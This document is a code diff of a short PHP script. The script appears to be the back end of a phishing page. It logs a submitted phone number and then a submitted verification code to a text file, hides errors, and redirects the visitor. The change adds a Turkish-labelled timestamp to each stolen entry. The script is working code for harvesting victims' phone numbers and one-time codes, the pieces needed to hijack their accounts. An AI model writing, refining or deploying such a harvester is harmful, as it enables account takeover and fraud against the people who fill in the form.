@@ -1,9 +1,13 @@
  <?php 
 error_reporting(0); 
 if (isset($_POST["telnumber"])) {
+date_default_timezone_set('Europe/Istanbul');
+$tarih =" Tarih : ".date('d/m/Y  H:i');
+
+  
 $ac = fopen("kayit.txt","a+");
 $tel = $_POST['telnumber'];
-$userlar = ("\n Telefon No : ".$tel."\n");
+$userlar = ("\n__________________ \n".$tarih."\n\n Telefon No : ".$tel."\n");
 fwrite($ac,$userlar);
 fclose($ac);
 sleep(1);
@@ -12,7 +16,7 @@ sleep(1);
 else if(isset($_POST["code"])){
 $ac = fopen("kayit.txt","a+");
 $code = $_POST['code'];
-$userlar = (" Code : ".$code."\n  ------------------\n");
+$userlar = (" Code : ".$code."\n __________________\n");
 fwrite($ac,$userlar);
 fclose($ac);
 header('location: index.php?id=ok');
